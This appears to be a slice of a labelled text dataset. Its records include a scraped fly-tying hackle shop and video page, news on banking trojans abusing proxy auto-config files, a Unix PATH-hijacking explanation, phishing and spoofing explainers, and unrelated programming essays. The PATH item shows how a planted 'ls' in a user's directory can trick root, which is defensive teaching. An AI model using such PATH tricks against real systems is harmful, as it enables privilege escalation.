Ｍｅｄｉｕｍ Ｐａｒｄ 蛍光オレンジ ¥１５００ ＵＰ画像 通常 Ｃｏｑ Ｄｅ Ｌｅｏｎ はドライフライのテールやマドラーミノーのハックル等にお使いいただけますが 今回の\n- Round Rubber Hackle jpg\n- 羽毛 人造材料\n- hackle stac jpg\n- <ハーフ カット> 全６色 ¥２７００ ¥３２００ ◆ナチュラル ◆ブラウン ◆オリーブ ◆ダークブラウン ◆イエロー ◆オレンジ 左から ◆ナチュラル ◆ダークブラウン ◆オリーブ ◆ブラウン ◆イエロー ◆オレンジ\n- Now tie in a Blue Hackle and a Black Hackle wind the hackles together down the body and secure with the rib\n- <ハーフ カット> 全６色 ¥２７００ ¥３２００ ◆ナチュラル ◆ブラウン ◆オリーブ ◆ダークブラウン ◆イエロー ◆オレンジ 左から ◆ナチュラル ◆ダークブラウン ◆オリーブ ◆ブラウン ◆イエロー ◆オレンジ\n- Wired Bead Head Prince Nymph http www riverbum com images produ dHead side jpg Soft Hackle CDC Nymph http planettrout files wordpress c oft hackle jpg Brown Mini Mirage Stone http www littledeschutesflyco com minimirage JPG\n- thackles jpg\n- rozwiązania Jednak wiązanie spadochroniarki nie wymaga aż takich zachodów Jak pokazuje to wideo spadochroniarkę można ukręcić w dwie minuty przy użyciu zwykłego imadła i rotacyjnych szczypców do jeżynek ten przyrząd przyda się do wiązania także innych much Kilka uwag proszę zauważyć że krętacz nawija jeżynkę od góry do dołu i mocuje ją\n- フライ用 ＳＡＤＤＬＥ ＣＡＰＥ ＣＵＴ ¥１０５０ ２２５０ ドライフライ用 ＣＯＣＫ ＮＥＣＫ １ ２ ¥２０００ ３８００ ＵＰ画像\n- 左から ◆ブラウン ◆オリーブ ◆ナチュラル\n- ＨＥＢＥＲＴ ＭＩＮＥＲ ＲＯＯＳＴＥＲ ＣＡＰＥＳ ¥７０００ 左から ＳＯＬＤ ＯＵＴ ＳＯＬＤ ＯＵＴ ◆Ｄｕｎ Ｂａｄｇｅｒ ◆Ｍｅｄｉｕｍ Ｇｒｅｙ Ｄｕｎ ◆Ｄａｒｋ\n- COLORS Chinese View Colors\n- hackle storm jpg\n- it has a strong grip and can be used as a short temporary bobbin The smaller ones can be hard to use if one suffers from arthritis or lack strength in fingers All items made in India 8mm x 48mm 5 8 x 1 7 8 Jaw length 6mm 1 4 Price is $3 00 each\n- ＨＥＢＥＲＴ ＭＩＮＥＲ ＲＯＯＳＴＥＲ ＣＡＰＥＳ ¥７０００ 左から ＳＯＬＤ ＯＵＴ ＳＯＬＤ ＯＵＴ ◆Ｌｉｇｈｔ Ｇｏｌｄｅｎ Ｏｌｉｖｅ ◆Ｙｅｌｌｏｗ\nrelated videos for hackle\n- Blending Hackle #1 How To Make Smooth Roving & Diz It Off how to make and diz smooth roving using mill prepped fiber\n- The Partridge and Yellow Soft Hackle Tying and fishing the classic Partridge and Yellow soft hackle fly.\n- Palmering Hackle Demo with Jay Nicholas In this new fly tying video, Jay Nicholas demonstrates the right way to palmer hackle on flies like wooly buggers, stimulators -- basically any fly that uses a hackle down the hook. For more fly tying tips, check out .\n- Holy Molar - Hackle The Hackle section from the Holy Molar - Dentist The Menace DVD. Sorry it's in black and white. But it does add raw emotion to it.\n- The Red Hackle Pipe Band - Marching Training #1 The Red Hackle Pipe Band gets taught how to march decently. The special guest and teacher for today is none other than [name to be posted later... maybe...], an ex-member of the Black Watch!\n- Parks' Fly Shop: Tying the White Miller Soft Hackle This is a fuzzy-bodied soft hackle caddis emerger pattern that's deadly on the Firehole River in June and September, where it imitates the Nectopsyche caddis. Hook: short shank dry #14. Thread: 8/0 light cahill Uni. Abdomen: pearl Ice Dub dubbed rough. Thorax: light shade Arizona Synthetic Pea*** dubbed rough. Hackle: cream hen.\n- Fly Tying: How to Tie the Woolly Bugger : Tying the Hackle & Rib: Woolly Bugger Fly Learn how to tie the hackle and rib of a Woolly Bugger fly in this free video on fly fishing. Expert: Jeff Wilkins Bio: Jeff Wilkins is that rare fly fisherman who is equally skilled at the tying bench and on the stream. A certified casting instructor, Wilkins began tying and guiding professionally in college. Filmmaker: Tom Jackson\n- Tying the Hackle Stacker Tying the Hackle Stacker BWO. Materials: #14 Emerger Hook, 8/0 Olive-Brown Thread, Gray Antron, Olive Turkey Biot, Olive CDC, Grizzly- Dyed Olive Hackle, Dark Green Spectrablend Dry Dubbing.\n- Tying the Partridge and Orange Soft Hackle Jeff Hines deomonstrates tying the Partridge and Orange soft hackle fly. Filmed at the 2003 FFF Southern Council Conclave in Mountain Home, Arkansas.\n- Spey Fly Hackles Atlantic Salmon Steelhead Fly Fishing Here is a simple way to make Spey hackles for fishing flies. The cost factor for using Blue Eared Pheasant and the like is just too high. Here is a way to make a great hackle at a fraction of the cost. Make sure you brush the wet feathers into shape and lay flat on paper to dry.\n- Gartside Soft Hackle\n- Bead Head Pheasant Tail Soft Hackle Fly tying demonstration of the bead head pheasant tail soft hackle. A fly tied with pheasant tail body, a pea*** herl thorax, and partridge soft hackle.\n- DIY Hackle loading This video shows how to load fiber onto a DIY Hackle made from hair picks and a board. For how to make this hackle....\n- Fiber Hackle, Wool Roving, Diz Removing blended wool from a hackle with an improvised diz; creating blended wool roving. The thin plastic diz was made from a coffee lid at Starbucks. The handmade hackle came from *fiberwish*/punkiedoodledo on Etsy and eBay.\n- Hackle Selection: Picking a feather for steelhead fly collars How do you pick a feather for hackling a steelhead fly? What kind of hackle do you use for a nice collar? Barrett Christiansen from The Caddis Fly Shop lays out the various hackles available, and weighs the pros and cons of each option. For more fly tying videos, check out .\n- How to palmer schlappen and hackle steelhead jigs. This is a brief tutorial on how to palmer schlappen and hackle steelhead jigs using solid brass beads instead of lead for the jig head.\n- Fiberwish Wool and Fiber Hackle How to use the Fiberwish Wool and Fiber Hackle.\n- Fly Tying - Part 8 - Hackle Nor-Vise Fly Tying System. Created by Norm Norlander, this is a great tool for any fly fisherman who wants to learn how to tie their own flies. Website: www.nor-\n- Tying the Hackle Stacker How to tie Quigley's Hackle Stacker with Missouri River guide Mike Kuhnert.\n- Tying the Holographic Soft Hackle Robert Prytula demonstrates tying his Holographic Soft Hackle fly, an effective fly for trout in East Tennessee. I've fished this fly in cloudy water conditions and it was very effective. Tie some up just for these conditions. Filmed at the 2007 FFF Southern Council Conclave in Mountain Home, AR.\n- Fly Fishing with a Woolly Bugger : How to Palmer Woolly Bugger Hackle Palmering the woolly bugger's hackle forward. Learn how to go fly fishing with awoolly bugger fly in this free video on fly tying. Expert: Alvin Dedeaux Contact: Bio: Alvin has been a fly fishing guide and casting instructor for 12 years, and has been fly fishing for 32 years. He is a graduate of the Joan Wulff fly casting instructor's school. Filmmaker: MAKE | MEDIA\n- Tying standard hackle tip wings Using hackle tips to create standard Adams style dry fly wings\n- Wool Combing, Fiber Combs, Hackle and Tools #2 Hand Made Fiber Tools by Blue Mountain Handcrafts and Combing Cria Alpaca into Smooth Spinnable Fiber.\n- Free Fly Tying Instructions: Parachute Adams Pattern : How to Wrap the Hackle: Fly Tying Pattern for Parachute Adams Learn how to wrap the hackle of a Parachute Adams artificial fly - free fly tying video instructions.\n- Fly Tying Dave's Soft Hackle Hook: Size 20 to 14 Diiachi or equivalent Body: Black Thread or color to match the hatch Thorax: Rabbit Dubbing or pea*** Rib: Copper or color to contrast Hackle: Hungarian partridge or equivalent This fly may be fished across and downstream\n- Soft Hackle Ray Charles - July 2009 TPO Fly of the Month Aaron ties up a tailwater killer. Justin and Aaron destroyed them at the Big Horn and several other Montana tailwaters with this. Easy and quick to tie, this fly is a must have for your next trip to a bottom release. The 20 inch rainbows couldn't stay off this at another famous Montana river.\n- How to add hackle to a parachute fly How to add a hackle to a parachute fly as demonstrated by Andrew Blake, a fishing guide from Turangi near Taupo in New Zealand. Check out his website at\n- Frisco kid Hackle you Frisco kid Hackle-you Belly\n- Chris Reeves' Soft Hackle Irish Mayfly - TPO Guest Fly # 2 Chris Reeves of the UK ties a staple of his box. He is an avid still water fisherman and fly tyer. Try out this soft hackle next time you are fishing in the film.\n- How to Wind Hackle How to wind hackle onto your dry fly as demonstrated by Andrew Blake, a fishing guide from Turangi near Taupo in New Zealand. Check out his website at\n- Tying a Soft Hackle Fly Wayne Walts, of Troutfitter, a fly fishing specialty shop in Syracuse, demonstrates tying a soft hackle fly. He's using a size 14 hook and a hen feather. Visit for more news and multimedia.\n- Chewee Skin Green McKenzie Soft Hackle In this video Barrett Christiansen demonstrates how to tie a Chewee Skin Green McKenzie Caddis Soft Hackle. This pattern imitates the large McKenzie Caddis that emerges on the McKenzie River near Eugene late April-June. The UV Chewee skin is a new and easy to use material for bodies, wing cases and shell backs. The UV quality to the material allows for the colors to show better to fish at distance and low light conditions. Fish this fly under a dry, swung wet fly style or skated near on on the surface.\n- Tying the Royal Coachman SoftHackle by Davie McPhail\n- Tying Tips 2 - Selecting Feathers for Soft Hackle Flies Jeff Hines discusses the selection of feathers for tying soft hackle flies. Filmed at the 2003 FFF Southern Council Conclave in Mountain Home, AR.\n- Wool Combing, Fiber Combs, Hackle and Tools #1 Hand Made Fiber Tools by Blue Mountain Handcrafts.\n- Tying with Hans- Hans' Spring Soft Hackle This easy to tie soft hackle pattern takes early season trout feeding on midges or emerging baetis mayflies. The purple thorax seems to be a trigger to trout. This fly can be fished deep behind a nymph, on the swing, or as a dropper a few inches behind a dry fly. Happy Tying\n- Hare's Ear Soft Hackle fly tying instructions The Hare's Ear Soft Hackle is just an all around great fly. This buggy little wet fly fishes great as a March Brown emerger on the Lower McKenzie River in the early spring. Easy to tie and great to have in the fly box. For more fly tying videos, check out .\n- Fly Tying with Hans: Soft Hackle Soft hackles have been around for a long, long time. In the video I say a hundred years; well I looked it up, try 500 years! There must be a reason- ah yes, they catch fish. These are simple flies to tie and they work extremely well. Experiment with various color schemes and materials.\n- Fly tying feathers: Hackle folding instructions Fly tying guru Jay Nicholas demonstrates how to fold and hackle fly tying feathers in this new video. For more fly tying demos and instructions, check out\n- Tying The Soft Hackle Nymph Using Micro Straggle All materials are available at Fly Tying Specialties. Provided by Steve Korbay at Fly Tying Specialties\ntwitter about hackle\nBlogs & Forum\nblogs and forums about hackle\n“Posted: Friday, April 17th, 2009 @ 7:41 pm in Crochet, Etsy, Family, Fiber Prep, Hackle, dyed, natural dying | 2 Comments \" Horner. Craft & Found. Craft Pattern Podcast. . Crochet Liberation Front blog. Etsy french Blog. InspireMeThursday”\n— Chez Plum \" Hackle,\n“PaFlyFish is your source for Pennsylvania fly fishing for trout and bass with stream reports, forum, maps, hatch charts and blog”\n— Pennsylvania Fly Fishing - new hackle [Forum - Fly Tying],\n“photos of Dullstroom wedding photography at Critchley Hackle \" Wedding Photography by Dror Eyal : South Africa wedding photographer”\n— Dullstroom wedding photography at Critchley Hackle \" Wedding, droreyal.co.za\n“Whats the best hackle?”\n— Whats the best hackle?,\n“We stayed at Critchley Hackle, in Dullstroom, on 22nd February, as an overnight stop on our way from Johannesburg to the Kruger Park. First comment it”\n— Our Visit to Critchley Hackle | African Safari and Travel News,\n“CARI Malay Forums Salam, nak tanya kenkawan kat sini, apa beza hackle warna warni yg dipakai ROTU tu?maksud saya, kalo warna oren dari mana?warna2 lain pulak dari man”\n— HACKLE - Agensi Keselamatan, Polis & Tentera - CARI Malay Forums, .my\n“Home \" Dennis Potter's Blog \" Ramblings of a Hackle Junkie The deeper you fish a soft hackle, the fewer fish you catch, but the size goes up. I”\n— Ramblings of a Hackle Junkie by Dennis Potter,\n“Majacraft now makes single and double row hackles”\n— Hackle-berry Finn | The Majacraft Blog, majacraft.co.nz\n“Fly Days of August: Orange PT Soft Hackle. August 19th, 2009 · No Comments. This has become Soft Hackle Materials. October 25th, 2008 · 7 Comments. Lets start with the hackles, where”\n— Soft Hackle,", "label": 1}
{"text": "Proxy auto config (PAC) is a feature accepted by all modern browsers, according to Fabio Assolini, a lab expert at Kaspersky. It contains a function to redirect browsers to a specific proxy server. A proxy server is a computer that accesses the Internet on a computer user's behalf, and feeds it the results. Proxy servers are often used by systems administrators as a gateway between an organization's computers and the Internet, and PAC files are set on client machines so that they always access the Internet through a protected gateway.\n\"Unfortunately this simple and smart proxy technique is being largely used by Brazilian malware writers to redirect infected users to malicious hosts serving phishing pages of financial institutions,\" Assolini said. \"After being infected by a Trojan banker, if a user tries to access some of the websites listed in the script, they will be redirected to a phishing domain hosted at the malicious proxy server.\"\nEven browsers designed securely from the bottom up, such as Google's Chrome, are susceptible to this attack, which changes the file prefs.js to insert a malicious proxy before adding a malicious dynamic link library to always rewrite the proxy, if it is removed.\nThis attack is an interesting variation on a more conventional redirection attack involving the Windows Hosts file. This is a plain text file containing a list of Domain Name System lookups, which a Windows computer will refer to first, before trying to resolve a domain name using an external server. Malware that alters DNS entries in a Hosts file instructs a Windows computer to visit any malicious IP address that the attacker wants when the user types in a legitimate web address, such as one for an online bank, for example.", "label": 1}
{"text": "The path is sometimes a big security problem. It is a very common way to hack into a system using some mistakes in path settings. It is easy to make Trojan horse attacks if hacker gets root or other users to execute his versions of commands.\nA common mistake in the past (?) was to keep '.' in the root's path. Malicious hacker makes program 'ls' in his home directory. If root makes\n# cd ~hacker # ls\nhe executes ls command of hacker's.\nIndirectly, this same applies to all the programs that are executed as root. Any of the important daemon processes should never execute anything that some other user can write into. In some systems, /usr/local/bin is allowed to contain programs with less strict security screening - it is just removed from the path of the root user. However, if it is known that some daemon executes 'foo' using path '/usr/local/bin/:...', it may be possible to cheat daemon to execute '/usr/local/bin/foo' instead of '/bin/foo'. Likely anybody who can write to '/usr/local/bin' is able to break into the system.\nIt is very important to consider in what order the directories are in the path. If /usr/local/bin is before /bin, it is a security risk - if it is after, it is not possible to overwrite command /bin/foo with some localized modification in /usr/local/bin/foo.\nIn Linux it should be remembered that the path evaluation is done in the operating system call level. Everywhere where an executable file path is given you can give a short name that is searched at least from /bin and /usr/bin - likely from many other places as well.", "label": 1}
{"text": "Virtualizing the Embedded World: Vista Over Linux in a Cell Phone?\nMotivation for Running a Hypervisor on Embedded Systems\nWhile you probably won't run Vista as a virtual machine on your cell phone, there are many viable use cases of virtualization for embedded applications. The most simplest, cheapest, feature rich is using Linux and KVM.\nServers and desktops are not alone, virtualization is also a perfect fit for embedded devices too.\nVirtualization benefits are well understood for the traditional server consolidation purposes. Hypervisors, aka virtual machine monitors (VMM) are common in almost every data center, saving equipment, power and management costs. Embedded applications, ranging from terabit routers, hardware appliances, media-rich set-top boxes to cellular phones and media players can all benefit from virtualization.\nAt a glance it may looks like an over kill to run virtual machines on embedded systems (see Figure 1). Embedded systems might be resource limited, having limited memory/CPU/latency/scheduling. They are also often tailor-made to match specific hardware/software combinations. Deeper insight reveals many advantages of virtualization for embedded:\n- Consolidation--Expensive custom-made hardware increase the motivation to consolidate several physical devices into a single one. Consolidation also helps to reduce complexity for distributed environments--All the virtual machines live on the same physical server, there are no risks of network partitioning, hardware failures are atomic and a common high availability (HA) solution deal with them while collapsing many scenarios.\n- Security--Breaking into the cellular phone management/java stack won't jeopardize the communication stack and the main cell if each of them is run in a different virtual machine (VM). The VM environment is a big sand box for untrusted code.\n- Reliability--Isolate privileged code and prevent/reduce entire device failures\n- Management and rapid development--Even if running RTOS for managing the hardware, there is no need to settle for its limited management capabilities. A management VM running Windows can run the user interface, making both users and developers life easier.\n- Hardware virtualization--VMM is an exact fit for hardware virtualization, dynamically divide and unit physical resources along with their virtual controller. Large, distributes embedded machines such as routers can be split and unite along with the router engine machine, executed as a VM.\n- Efficiency--In the multi-core era many physical cores are under-utilized, some not even initialized since the embedded software was uni-processor\n- New exciting features--Sophisticated features like snapshots, live migration, external hibernation can enhance embedded products that tend to demand high availability, upgradability (even remote kernel upgrades), etc\n- Law--Unlinkage of the GPL code from proprietary code can be easily obtained using virtualization\n- Skip Ahead\n- 1. Motivation for Running a Hypervisor on Embedded Systems\n- 2. Motivation for Running a Hypervisor on Embedded Systems\n- 3. Motivation for Running a Hypervisor on Embedded Systems\n- 4. Motivation for Running a Hypervisor on Embedded Systems\nSolid state disks (SSDs) made a splash in consumer technology, and now the technology has its eyes on the enterprise storage market. Download this eBook to see what SSDs can do for your infrastructure and review the pros and cons of this potentially game-changing storage technology.", "label": 1}
{"text": "What is phishing?\nPhishing is an attempt to steal sensitive information, such as your social security number or passwords, by posing as a trusted company. It is most commonly attempted via an email that will claim to come from a trusted company, such as your bank or your credit card company. If you follow the links provided in the email, you will appear to be providing your information to the trusted company, while in fact you will be providing that information to a phisher. Phishers are known for using this information for identity theft and other fraudulent acts.\nHow do I recognize phishing?\nPhishing attempts are getting more and more difficult to recognize. There are some general rules of thumb that can help you identify them.\nFirst, companies should not ask you any sensitive information via email. Legitimate companies that require sensitive information from you will typically send you a physical letter or require that you come in to their place of business to confirm your identity. If an email contains a link that you can click on, you should be suspicious.\nSecond, if the information request appears to come from a company that you do use, such as your bank, and you are unsure if it is a phishing email or not, give them a phone call instead of following the link in the email.\nThird, almost any company that can contact you via email could also contact you via phone. Despite whatever consequences of not responding are listed in the email, consider not responding. Almost all large companies, especially financial institutions, will attempt to contact you through a means other than email before taking any action against your account.", "label": 1}
{"text": "But what if someone you trust urged you via e-mail to download a seemingly important file – would you do that?\nIt’s no secret that criminals often hide their true identity in order to trick people into falling for their scams. And it’s so easy to pose as someone else on the internet, especially since those who you’re talking to can’t really see you. Impersonating someone else in order to trick potential victims into taking certain actions that they wouldn’t normally take is one of the most common tactics used by cybercriminals to make their internet security scams successful. Not only can cybercrooks successfully pass as someone else, but they can also design programs and websites to look like other legitimate ones. In either case, we’re talking about spoofing – the art of online masquerading, as most internet security experts call it.\nSpoofing versus phishing\nA common misconception about spoofing is that it’s the same thing as phishing. In fact, they’re two different internet security threats, but strongly tied to one another. Phishing is basically tricking someone to give up sensitive information – usually social and bank account credentials and credit card details. Spoofing, on the other hand, refers to how cybercrooks actually trick their target – by posing as a well-known, trustworthy entity. So, more often than not, phishers rely on spoofing in order for their phishing scams to be successful.\nFor example, you receive an e-mail from your bank telling you your account has been suspended for whatever reason, and in order to reactivate it, you have to hand over your credit card details. This, clearly, is a phishing attempt – your bank would never send you such e-mails! And the fact that the e-mail seems to come from your bank, when in fact it doesn’t – that’s spoofing.\nThe most common forms of spoofing\nSpoofing is one of the oldest tricks in the book – cybercriminals’ book, that is – but also one of the most effective in breaching web users’ internet security. Over the years it has taken on various forms, depending on technological advancements and trends in web users’ activity. Here are the most common forms of spoofing you’re most likely to come across in the WWW:\n- E-mail spoofing. The example provided above is actually a form of e-mail spoofing. The sender address and the signature are made up to appear as though the e-mail was sent by a certain person or company. To make their e-mails look authentic and credible, cybercrooks have spoofed e-mail sender sections by listing names of renowned banks and websites like eBay, Amazon and PayPal, and continue to do so.\n- URL spoofing. In some internet security scams, cybercrooks reproduce legitimate webpages and send the legit-looking web address (URL) in fake e-mails to web users or place it on other sites. When a user clicks on it, they’re redirected to the malicious site. Cybercrooks can also create malware that exploits web browser vulnerabilities; if a user unknowingly downloads it onto their PC, the malicious bit can manipulate their browser to show, for example, a fake bank account login page, whenever they browse for the real thing. In this particular case, the user is faced with a man-in-the-browser attack.\n- Spoofing files on file-sharing platforms. Not all files you find on popular file-sharing platforms are legitimate. Some of them may look like the real thing, with the same name/title/author, but in fact they may be fake and contain some kind of malware.\n- IP spoofing. Hackers can gain unauthorized access to computer networks by making the IP address of their computer look like the one of a trusted machine. This way they can perform network attacks and make them look as being performed by another entity.\n- Wi-fi spoofing. Some Wi-fi hotspots can look like they’re owned by reputable companies, but in fact, they’re set up by cybercrooks who want to steal data received or sent by users.\nProtect yourself from spoofers!\nHere’s a bunch of solid internet security tips to protect yourself and your device from the threats listed above:\n- Be suspicious of every e-mail that asks you to hand over personal information, no matter if the sender is a close relative or a trustworthy institution. Remember: your bank would never ask you for your credit card details via e-mail; Facebook would never ask for your account credentials this way either. If you receive an e-mail from them linking to their site, don’t click on the link provided. Instead, open the respective site from a new window, just to avoid accessing a fake one.\n- Beware of phishing attacks. Keep yourself informed about new phishing methods and for extra protection, install an internet security suite that comes with Antiphishing and Safe Browsing to warn you against malicious websites. BullGuard’s internet security suite comes with such features.\n- Don’t be too trusting when it comes to the security of file-sharing platforms. It’s best you have your own security in place, i.e. effective antivirus protection like the one offered by BullGuard Internet Security 12. Its antivirus engine protects your computer even from the newest forms of malware.\n- Make sure you have a solid Firewall installed on your PC, to counter any network attacks from hackers.\n- Be careful with public Wi-fi hotspots. It’s best you don’t bank or shop online while connected to a hotspot, as you never know what prying eyes might be “watching” your transaction and steal your financial details.", "label": 1}
{"text": "Energy Efficient Programming\nIn my most recent job I was looking at energy efficient computing, which is a big deal in mobile computing. Everyone wants their tablet or phone or notebook to run as long as possible on a single charge of the battery. Efficient use of energy is also becoming a really big deal in cloud computing with all those processors sitting in a data center (supporting mobile computing users) and technical computing centers where larger and larger clusters are assembled on the road to Exascale computations. One notable alternative energy source is the supercomputer in the Advania Thor Data Center in Iceland, which uses hydro- and geothermal energy that is relatively cheap. (I wonder if they simply open a window to cool down the data center machines.)\n- IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies\n- Application Testing Strategies in the IBM z/OS Environment\n- Strategy: How to Conduct an Effective IT Security Risk Assessment\n- Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5\n- The Untapped Potential of Mobile Apps for Commercial Customers\n- Why is Information Governance So Important for Modern Analytics?\nAs with processor speeds in the run up to multicore processors for the masses, the energy envelope of hardware is being improved (i.e., lowered) with each new generation. Recently I was made privy to the plans of a large international chip producer and found the numbers impressive as to how low it is going to be taking the power usage in its flagship processors over the next few years. From all this data and the focus on improving energy utilization in hardware, it looks like software developers are still in the \"free lunch\" phase with regards to energy consumption. That is, I can simply wait until the next processor generation is released, recompile my application, and get the benefit of equal or better execution performance while the power consumption of my application improves automatically.\nIn those halcyon days when I could spend a year at the beach instead of coding and still speed up my code execution by running my application on the faster, next-generation processor, it was still possible to make improvements to the application that would optimize execution and increase the execution speed on the currently available hardware. Now, for those of us that might be more proactive about energy efficiency (or don't have a beach close enough), I wonder if there is anything a programmer might be able to do that would directly affect the power consumption of a given piece of code. In more colloquial terms, I could pose the question: \"Which is more energy efficient: a\nfor loop or a\nI'm sure that I'm showing my ignorance of hardware and computer architecture when I say, \"Yes, a programmer can affect the energy consumption of an application, but not as directly as we might hope.\" Allow me to qualify that before you jump all over my naiveté.\nIn the arena of serial programming (more on the effects of parallel execution in a few paragraphs), there might not be much programmer influence on energy usage. I am assuming the execution of one instruction requires the same amount of energy as any other instruction. From what I remember about modern computer architecture and the execution of instructions, there is a pipeline to perform all the steps required and there are fixed number of stages in the pipeline. This suggests that it doesn't matter if the instruction is a floating-point or integer operation; the energy needed to traverse the pipeline is the same. I do recall that there are more overall steps involved in handling floating-point numbers versus integers, but that just might mean some stages in the pipeline are skipped. Is there any appreciable energy savings to be had when bypassing the exponent normalization? Even if my assumption on energy consumption between two different operations is wrong, there aren't many applications that I know of where you can replace floating-point calculations with an integer operation and still yield correct results.\nLooking in a positive direction, one thing that I am sure can be done by the programmer would be to reduce the total number of instructions. If you can accomplish in 100 instructions what can also be done in 200 instructions, the former execution will use less overall energy. There are certainly large changes in the number of instructions used by one algorithm over another; e.g., Quicksort over Bubblesort. Unrolling loops will perform the same number of computational steps, but reduces the number of testing and looping instructions that are executed. There might be some difference in the energy consumption between a\nfor loop and a\nwhile loop if the number of instructions involved in incrementing loop index variables and testing termination conditions are significant between the two variations. If there is such a difference and such a change is feasible, is that energy savings worthwhile for all the time and effort it would take to recode from one loop format to the other?\nVector operations are another place where a programmer can reduce the consumption of energy by an application. Does it cost any more energy to execute on a single operand (in a vector register) than it would require if you load up the vector register with four operands? I would think both situations are the same, but the latter gets four times the results and is able to compute the desired answers in one-fourth of the time with only one quarter the energy consumed. Compilers can detect many instances where vector computations could be used even if the programmer didn't explicitly code for vector operations. If the compiler can't make that call due to conservative assumptions, intervention by the programmer via compiler directives or pragmas will inform the compiler that such vectorizations are safe. Adding these compiler hints will be much less time-consuming than changing loop structures. In cases where vectorization might not be viable, but there are still independent computations that can be executed concurrently, there is still a possibility for energy conservation on multicore processors.\nToday's processors, as I mentioned earlier, are more energy aware. When the processor is not actively executing, it will be set into a lower powered state as it sits idle. When some execution is ready to proceed, the frequency and power are amped up and the computation is executed. For sake of example, let me assume I have a quad-core processor that runs at 5Wh (Watts per hour) per core when the core is running at full speed and 1Wh per core when idle. Running a serial computation that takes 4 hours will burn 32 Watts (20, 1 core x 5Wh x 4 hours, for the active core and 12, 3 cores x 1Wh x 4 hours, for the three idle cores). If I can parallelize that same computation across all four cores, the execution time will be only one hour and the total energy used will be only 20 Watts (4 cores x 5Wh x 1 hour). Not only is the answer computed quicker, but the parallel execution has a tangible energy savings.\nI was once told that a prominent GPU producer had measured the amount of energy that every operation (computation, access to memory, moving data in from off-card, etc.) took on its products. If an addition or multiplication or a register shift take different amounts of energy, how willing would you be to find just the right mix of equivalent instructions to carry out some desired computation? Then, how much documentation do you need to provide to the programmer that needs to maintain your code so that the version you implemented — instead of the standard algorithm — is much better for everyone? There are easier ways to conserve power (outlined above) and do your little part to save the polar ice caps and the planet, which will help keep the oceanfront beaches where they are instead of outside your third-story window.", "label": 1}
{"text": "A common recommendation in our profession is to learn a new language each year. This advice can truly be sold only to people starting out in software development, rather than practiced hands. Unless you're a language junkie, this is advice that cannot be followed because languages take more than a year to learn well (that is, far beyond simple exposure and noodling with small projects).\n- IDC Analyst Connection: Using Blade Systems to Cut Costs and Sharpen Efficiencies\n- Application Testing Strategies in the IBM z/OS Environment\n- Strategy: How to Conduct an Effective IT Security Risk Assessment\n- Strategy: Smartphone Smackdown: Galaxy Note II vs. Lumia 920 vs. iPhone 5\n- The Untapped Potential of Mobile Apps for Commercial Customers\n- Why is Information Governance So Important for Modern Analytics?\nA language doesn't really begin to expose its strengths and weaknesses until you write programs of several thousand lines. That's the point where you recognize that a feature that looked appealing is now an encumbrance and another feature that seemed pointless is truly valuable. This insight is equally true of the principal tools in the language's ecosystem, most especially the debugger and the build tools. The former is particularly important, because errors are expressed in radically disjoint ways in different languages.\nThere is another stage beyond this level, which is writing idiomatically in the language, rather than taking our native coding style into the new world. This last step is particularly difficult. I'm speaking here conceptually, rather than syntactically. Each language uniquely expresses fundamental concepts that it favors. For example, Go, which we've discussed extensively during the last 12 months, does not use object orientation in the usual way, rather it favors composability. Composability requires a whole different approach to building programs from objects. It forces newbies to rethink how OO works and how to represent programs as objects. If you stop short of learning composability in Go, and simply learn the syntactic equivalents of operations you already know, then you've lost most of the benefit of the \"learn a new language\" dictum. This is where the real value accrues. Build some multi-KLOC programs using composability and there is no doubt you will write different code when you return to C++ or Java.\nThis underscores a key point: To maximize the value of learning a new language, it's important to choose one that is significantly different from the ones you know: for example, learning a functional language if your natural home is OO; learning OO if your natural home is imperative; and so on.\nAfter choosing a language that sparks your interest, it's important to avoid the path of least resistance, which goes something like this: Buying a tutorial. Going through the first 150 pages and learning the syntax plus a few handy concepts. Putting the book down and starting to work on a small sample project. And then looking up items on an ad hoc basis when you need them later. The slip is in not finishing the tutorial. As a result, you pick up only the simple things that you need immediately and lose all the advanced topics.\nHave you really learned Java if you've not explored reflection, serialization, or, say, class loaders? I submit you probably haven't. And unfortunately for many of us (me included), we learn the subset that is predominantly needed by daily work. Why learn reflection if I don't need reflection in my work? The answer is clear: If you don't know reflection, you will never spot the opportunities where it will best solve a problem. (I don't want to stray too far off topic, but this is the benefit of reading other people's code. Good developers use the entire palette of features of a language, so reading their code illuminates instances where an elegant solution is possible via a little advanced feature you might not have known about.)\nThe bottom line is that learning a new language is both a long effort and a deeply rewarding one. I don't believe that a language can be mastered at the rate of one a year, so I view the recommendation to do this as pie-in-the-sky silliness, rather than a worthy goal. A much better path, in my view, is to learn several rather different languages well. And then cultivate and maintain the central ones you need by making sure you stay up with advances in the language and reading the code of other, better developers.", "label": 1}
{"text": "Embedded devices a cinch to pwn\nThe weak link in the chain\nCanSecWest Cell phones, modems, routers and similar devices are a lot easier to hack than most people think, making them an opportune target for criminals looking for an easy way to pierce a network, a researcher from Juniper networks says.\nSpeaking at the CanSecWest security conference in Vancouver, Barnaby Jack demonstrated how a soldering kit and some basic knowledge about the processors typically used in embedded devices can allow miscreants to download the firmware running on the hardware. The code can then be modified to make the devices do all kinds of nefarious things, he warns.\nOver the past decade, computers - usually those running Windows - have emerged as the vector of choice for cyber crooks. That is beginning to change for several reasons. For one, years of trial and error (with an emphasis on error) has helped Microsoft harden the defenses of its software, making it harder to find critical vulnerabilities. At the same time, the number of cell phones, routers and other embedded devices has proliferated.\nHardware designers often make it easy for their devices to be hacked because they contain debugging functionality and hardware interfaces not needed by end users.\nJack demonstrated how modified firmware for a router made by D-Link changed default settings so remote administration was enabled. (He emphasized gear made by other vendors was equally at risk.) That in turn would allow the router to be accessed remotely, potentially allowing the altering of DNS settings or the disclosure of VPN credentials.\nWe would have been more impressed had it been possible to modify the firmware remotely. Alas, that was not the case. To alter the settings, the criminal would need to access the device on the local area network. Jack claims similar attacks could be carried out over the net.\nWe'll give Jack the benefit of the doubt here, not just because we're in a charitable mood, but also because he makes a good point. Embedded devices are everywhere and we suspect little thought or money is put into fortifying them against the increasing sophistication of today's cyber attacks. Consider yourselves warned. ®", "label": 1}
